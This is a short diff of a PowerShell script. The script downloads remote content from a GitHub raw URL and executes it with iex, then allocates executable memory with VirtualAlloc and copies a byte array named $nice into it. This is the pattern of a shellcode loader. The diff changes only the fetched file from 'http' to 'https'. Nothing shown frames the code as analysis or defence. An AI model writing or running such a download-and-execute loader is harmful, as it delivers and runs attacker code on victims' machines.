@@ -15,7 +15,7 @@ $Win32 = @"
     }	        
 "@
 Add-Type $Win32; 
-iex (iwr https://raw.githubusercontent.com/sconceicao/binsexe/main/http).content
+iex (iwr https://raw.githubusercontent.com/sconceicao/binsexe/main/https).content
 $size = $nice.Length;
 [IntPtr]$addr = [Win32]::VirtualAlloc(0, $size, 0x3000, 0x40);	
 [System.Runtime.InteropServices.Marshal]::Copy($nice, 0, $addr, $size);
